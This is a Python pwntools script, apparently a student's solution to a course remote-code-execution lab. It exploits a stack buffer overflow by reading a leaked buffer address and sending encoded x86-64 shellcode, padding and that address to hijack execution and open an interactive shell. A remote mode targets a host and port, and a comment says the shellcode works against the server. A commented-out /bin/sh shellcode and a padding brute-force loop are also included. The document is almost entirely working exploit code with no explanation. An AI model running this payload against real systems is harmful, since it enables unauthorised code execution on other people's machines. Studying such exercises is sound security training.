from pwn import *
import sys

# Buffer size is not 16 on the server
ADDR_SIZE = 8
OFFSET = 8
# SHELL_CODE = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

# This shell code WORKS! AND WE CAN CONNECT TO THE SERVER! BUT WE NEED TO MAINTAIN THE CONNECTION
buf = b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\x37\xd7\xae\xab\x06"
buf += b"\x2a\xdc\x4b\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x5d\xfe\xf6\x32\x6c\x28\x83\x21\x36"
buf += b"\x89\xa1\xae\x4e\xbd\x94\xf2\x35\xd7\xae\xfc\xaa"
buf += b"\x43\x67\x52\x66\x9f\x27\x4d\x6c\x3a\x86\x21\x1d"
buf += b"\x8f\xa1\xae\x6c\x29\x82\x03\xc8\x19\xc4\x8a\x5e"
buf += b"\x25\xd9\x3e\xc1\xbd\x95\xf3\x9f\x62\x67\x64\x55"
buf += b"\xbe\xc0\x84\x75\x42\xdc\x18\x7f\x5e\x49\xf9\x51"
buf += b"\x62\x55\xad\x38\xd2\xae\xab\x06\x2a\xdc\x4b"


SHELL_CODE_LEN = len(buf)
# info(SHELL_CODE_LEN)
LOCAL_BUFF_SIZE = 512 + OFFSET - SHELL_CODE_LEN


# GDB script
gdb_script = """
break 25
break 30
continue
"""
# Prepare program
exe = "/home/k-730/COMP6841/wk2/RCE/challenge2"
binary = context.binary = ELF(exe, checksec=True)
context.log_level = "DEBUG"
mainAddrInt = binary.symbols.get("main")
mainAddr = p64(mainAddrInt, "little")
context(os="linux", arch="amd64")


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([exe] + argv, *a, **kwargs)


# Run the debugger
buffsize = LOCAL_BUFF_SIZE

# exit(1)
io = start()
io.recvlines(1)
io.recvuntil(b": ")
# Read in the memory given by the output
bufferAddrRaw = io.recvline().strip()
intAddr = int(bufferAddrRaw, 16)
bufferAddrBytes = intAddr.to_bytes(8, "little")
info(bufferAddrBytes)
info(
    f"Buffer address(&name) in little endian is: {str(p64(intAddr, "little"))} \nor big endian: {bufferAddrRaw}"
)

payload = buf + LOCAL_BUFF_SIZE * b"A" + bufferAddrBytes
info(
    f"Jumping to {bufferAddrBytes} in little endian form or big endian 0x{(u64(bufferAddrBytes, "big")):x}"
)
io.sendline(payload)
io.interactive()
# result = io.recvall()


# result = io.recvall(timeout=5)
# io.sendline(b"ls")
# result = io.recvall()

# print(result)


# for i in range(SHELL_CODE_LEN, 512 + OFFSET - SHELL_CODE_LEN):
#     io = start()
#     io.recvlines(1)
#     io.recvuntil(b": ")
#     # Read in the memory given by the output
#     bufferAddrRaw = io.recvline().strip()
#     intAddr = int(bufferAddrRaw, 16)
#     bufferAddrBytes = intAddr.to_bytes(8, "little")
#     info(bufferAddrBytes)
#     info(
#         f"Buffer address(&name) in little endian is: {str(p64(intAddr, "little"))} \nor big endian: {bufferAddrRaw}"
#     )
#     try:
#         payload = SHELL_CODE + i * b"A" + bufferAddrBytes
#         info(
#             f"Jumping to {bufferAddrBytes} in little endian form or big endian 0x{(u64(bufferAddrBytes, "big")):x}"
#         )
#         io.sendline(payload)
#         # io.interactive()
#         result = io.recvall(timeout=1)
#         # io.sendlxine(b"ls")
#         # result = io.recvall()
#         print(result)
#     except Exception as e:
#         print(e)
